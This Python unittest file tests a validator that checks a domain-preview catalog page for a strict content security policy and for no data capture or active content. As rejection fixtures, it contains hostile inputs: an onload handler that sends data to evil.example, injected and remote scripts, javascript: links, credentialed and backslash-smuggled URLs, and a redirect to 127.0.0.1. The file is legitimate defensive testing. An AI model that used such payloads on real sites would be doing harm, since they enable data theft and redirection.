import importlib.util
import json
from pathlib import Path
import tempfile
import unittest
from urllib.request import Request


ROOT = Path(__file__).resolve().parent
SPEC = importlib.util.spec_from_file_location("review_probe", ROOT / "review_probe.py")
PROBE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(PROBE)


ALLOWED = [
    "pawsfectwalks.com",
    "spaceghostkilla.com",
    "iamjordanrobison.com",
    "find-fido.com",
    "iambirdy.com",
    "ill.network",
    "illnet.ai",
    "hearty.fit",
    "healthyheart.clinic",
    "starfieldstudio.com",
    "illnet.net",
    "starfieldstudio.shop",
    "starfieldstudio.store",
    "starfieldstudio.info",
]
EXCLUDED = [
    "sxswasted.com",
    "austinfcsoccer.com",
    "austinfcsoccer.net",
    "austinfcjerseys.com",
    "atxsoccerjerseys.com",
]
URL = "https://iamjordanrobison.com/domain-previews/review.html"
TEST_CSP = (
    "default-src 'none'; script-src 'self'; style-src 'self'; "
    "img-src 'self' https://raw.githubusercontent.com/jordanistan/iambirdy/main/iambirdy.jpg; "
    "font-src 'self'; connect-src 'none'; frame-src 'none'; object-src 'none'; "
    "base-uri 'none'; form-action 'none'"
)


def valid_html(*, extra: str = "", omit: str | None = None) -> bytes:
    links = "".join(
        f'<a href="{domain}/index.html">{domain}</a>'
        for domain in ALLOWED
        if domain != omit
    )
    return f"""<!doctype html>
<html><head>
<title>Domain studio / All previews</title>
<meta http-equiv="Content-Security-Policy" content="{TEST_CSP}">
<link rel="icon" href="assets/favicon.svg"><link rel="stylesheet" href="assets/site.css">
</head><body>
<div>DESIGN REVIEW · No live booking, payments, or data capture</div>
{links}{extra}<script src="assets/site.js"></script>
</body></html>""".encode()


class ReviewProbeTests(unittest.TestCase):
    def validate(self, html: bytes) -> dict:
        return PROBE.validate_catalog(
            html,
            source_url=URL,
            allowed_domains=ALLOWED,
            excluded_domains=EXCLUDED,
        )

    def test_review_catalog_passes_exact_boundary_checks(self):
        result = self.validate(valid_html())
        self.assertEqual(14, result["catalog_links"])
        self.assertEqual(0, result["capture_controls"])
        self.assertTrue(result["csp_meta"])

    def test_missing_allowed_domain_is_rejected(self):
        with self.assertRaisesRegex(PROBE.ProbeError, "Missing allowed"):
            self.validate(valid_html(omit="iambirdy.com"))

    def test_held_domain_is_rejected(self):
        with self.assertRaisesRegex(PROBE.ProbeError, "Held domain"):
            self.validate(valid_html(extra='<a href="sxswasted.com/index.html">hold</a>'))

    def test_capture_controls_are_rejected(self):
        for control in ("<form></form>", "<input>", "<select></select>", "<textarea></textarea>"):
            with self.subTest(control=control):
                with self.assertRaisesRegex(PROBE.ProbeError, "data-entry"):
                    self.validate(valid_html(extra=control))

    def test_mailto_and_payment_links_are_rejected(self):
        for link in ("mailto:test@example.test", "https://checkout.stripe.com/demo"):
            with self.subTest(link=link):
                with self.assertRaises(PROBE.ProbeError):
                    self.validate(valid_html(extra=f'<a href="{link}">unsafe</a>'))

    def test_every_unapproved_or_inline_script_is_rejected(self):
        unsafe_scripts = (
            "<script>fetch('/collect')</script>",
            '<script src="https://example.test/app.js"></script>',
            '<script src="other.js"></script>',
            '<script src="/cdn-cgi/rocket-loader.min.js"></script>',
            '<script src="\\\\evil.example/app.js"></script>',
        )
        for script in unsafe_scripts:
            with self.subTest(script=script):
                with self.assertRaises(PROBE.ProbeError):
                    self.validate(valid_html(extra=script))

    def test_base_element_is_rejected(self):
        with self.assertRaisesRegex(PROBE.ProbeError, "base element"):
            self.validate(valid_html(extra='<base href="https://example.test/">'))

    def test_weak_csp_is_rejected(self):
        html = valid_html().replace(
            b"default-src 'none'; script-src 'self'",
            b"default-src * 'unsafe-inline'; script-src 'self'",
        )
        with self.assertRaisesRegex(PROBE.ProbeError, "approved policy"):
            self.validate(html)

    def test_duplicate_attributes_cannot_hide_browser_targets(self):
        html = valid_html().replace(
            f'<meta http-equiv="Content-Security-Policy" content="{TEST_CSP}">'.encode(),
            f'<meta http-equiv="Content-Security-Policy" content="default-src *" content="{TEST_CSP}">'.encode(),
        ).replace(
            b'<script src="assets/site.js">',
            b'<script src="https://example.test/app.js" src="assets/site.js">',
        ).replace(
            b'<a href="pawsfectwalks.com/index.html">',
            b'<a href="https://example.test/" href="pawsfectwalks.com/index.html">',
        )
        with self.assertRaisesRegex(PROBE.ProbeError, "duplicate"):
            self.validate(html)

    def test_refresh_inline_style_and_active_resources_are_rejected(self):
        unsafe = (
            '<meta http-equiv="refresh" content="0;url=https://example.test/">',
            "<style>body{display:none}</style>",
            '<div style="background:url(https://example.test/pixel)">x</div>',
            '<img src="https://example.test/pixel">',
            '<iframe src="https://example.test/"></iframe>',
            '<link rel="stylesheet" href="https://example.test/app.css">',
        )
        for markup in unsafe:
            with self.subTest(markup=markup):
                with self.assertRaises(PROBE.ProbeError):
                    self.validate(valid_html(extra=markup))

    def test_inline_events_and_body_csp_are_rejected(self):
        csp = f'<meta http-equiv="Content-Security-Policy" content="{TEST_CSP}">'.encode()
        html = valid_html().replace(csp, b"").replace(b"<body>", b'<body onload="fetch(\'https://evil.example/collect\')">' + csp)
        with self.assertRaises(PROBE.ProbeError):
            self.validate(html)

    def test_resource_hints_are_rejected(self):
        with self.assertRaisesRegex(PROBE.ProbeError, "link relationship"):
            self.validate(valid_html(extra='<link rel="preconnect" href="https://evil.example">'))

    def test_inert_containers_cannot_hide_active_content(self):
        for markup in ("<template><script src=evil.js></script></template>", "<noscript>unsafe</noscript>"):
            with self.subTest(markup=markup):
                with self.assertRaisesRegex(PROBE.ProbeError, "inert container"):
                    self.validate(valid_html(extra=markup))

    def test_insecure_unknown_and_credentialed_urls_are_rejected(self):
        for url in (
            "http://iamjordanrobison.com/domain-previews/review.html",
            "https://example.test/review.html",
            "https://user:password@iamjordanrobison.com/review.html",
            "https://iamjordanrobison.com/review.html#fragment",
            "https://iamjordanrobison.com:8443/review.html",
            "https://iamjordanrobison.com/review.html\\@example.test/",
        ):
            with self.subTest(url=url):
                with self.assertRaises(PROBE.ProbeError):
                    PROBE.approved_url(url)

    def test_redirect_handler_rejects_target_before_following(self):
        handler = PROBE.ApprovedRedirectHandler()
        request = Request(URL)
        for target in (
            "http://iamjordanrobison.com/review.html",
            "https://127.0.0.1/internal",
            "https://example.test/review.html",
            "https://iamjordanrobison.com:8443/review.html",
        ):
            with self.subTest(target=target):
                with self.assertRaises(PROBE.ProbeError):
                    handler.redirect_request(request, None, 302, "Found", {}, target)

    def test_whitespace_mailto_and_active_schemes_are_rejected(self):
        for link in (
            " mailto:test@example.test",
            "javascript:alert(1)",
            "data:text/html,unsafe",
        ):
            with self.subTest(link=link):
                with self.assertRaises(PROBE.ProbeError):
                    self.validate(valid_html(extra=f'<a href="{link}">unsafe</a>'))

    def test_oversized_response_is_rejected(self):
        with self.assertRaisesRegex(PROBE.ProbeError, "exceeds"):
            PROBE.parse_catalog(b"x" * (PROBE.MAX_RESPONSE_BYTES + 1))

    def test_portfolio_configuration_requires_fourteen_domains(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "sites.json"
            path.write_text(
                json.dumps(
                    {
                        "sites": [{"domain": domain} for domain in ALLOWED[:-1]],
                        "aliases": [],
                        "excluded": EXCLUDED,
                    }
                ),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(PROBE.ProbeError, "14 unique"):
                PROBE.load_domains(path)

    def test_actual_portfolio_configuration_matches_fixed_boundaries(self):
        allowed, excluded = PROBE.load_domains(ROOT / "sites.json")
        self.assertEqual(ALLOWED, allowed)
        self.assertEqual(EXCLUDED, excluded)


if __name__ == "__main__":
    unittest.main()
